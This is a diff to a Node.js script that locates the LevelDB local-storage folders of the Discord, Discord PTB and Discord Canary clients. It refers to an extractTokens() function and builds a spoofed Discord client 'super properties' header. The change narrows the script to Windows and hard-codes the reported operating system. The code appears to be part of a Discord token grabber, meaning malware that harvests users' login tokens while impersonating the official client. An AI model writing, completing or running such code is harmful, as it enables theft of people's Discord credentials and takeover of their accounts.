@@ -7,22 +7,14 @@ const { execSync } = require('child_process');
 
 function getDiscordLevelDbDirs() {
   const dirs = [];
-  const isWin = process.platform === 'win32';
-  const isMac = process.platform === 'darwin';
-  const isLinux = process.platform === 'linux';
+  const appData = process.env.APPDATA;
+  if (!appData) return dirs;
 
   const clients = ['discord', 'discordptb', 'discordcanary'];
 
   for (const client of clients) {
-    let p = null;
-    if (isWin && process.env.APPDATA) {
-      p = path.join(process.env.APPDATA, client, 'Local Storage', 'leveldb');
-    } else if (isMac) {
-      p = path.join(os.homedir(), 'Library', 'Application Support', client, 'Local Storage', 'leveldb');
-    } else if (isLinux) {
-      p = path.join(os.homedir(), '.config', client, 'Local Storage', 'leveldb');
-    }
-    if (p && fs.existsSync(p)) {
+    const p = path.join(appData, client, 'Local Storage', 'leveldb');
+    if (fs.existsSync(p)) {
       dirs.push({ client, dir: p });
     }
   }
@@ -108,7 +100,7 @@ function extractTokens() {
 }
 
 const superProps = Buffer.from(JSON.stringify({
-  os: process.platform === 'win32' ? "Windows" : (process.platform === 'darwin' ? "Mac OS X" : "Linux"),
+  os: "Windows",
   browser: "Discord Client",
   release_channel: "stable",
   client_version: "1.0.9266",
